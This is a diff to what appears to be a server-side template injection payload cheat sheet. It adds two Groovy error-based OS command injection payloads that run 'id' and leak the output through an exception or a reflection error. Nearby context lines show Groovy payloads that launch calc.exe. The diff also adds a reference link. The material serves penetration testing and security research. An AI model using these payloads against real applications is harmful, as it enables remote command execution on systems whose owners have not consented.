@@ -293,6 +293,8 @@ ${"calc.exe".exec()}
 ${"calc.exe".execute()}
 ${this.evaluate("9*9") //(this is a Script class)}
 ${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
+throw new Exception('id'.execute().text)
+def result = "id".execute().text\njava.lang.reflect.Field field = Thread.currentThread().getClass().getDeclaredField("win3zz"+result);
 ```
 
 ### Groovy - Sandbox Bypass
@@ -1216,3 +1218,4 @@ layout template:
 * [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Dec 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
 * [Leveraging the Spring Expression Language (SpEL) injection vulnerability ( a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
 * [Expression Language Injection - OWASP](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
+* [Groovy Error-based OS Command Injection Payloads](https://twitter.com/win3zz/status/1799688310128029701)
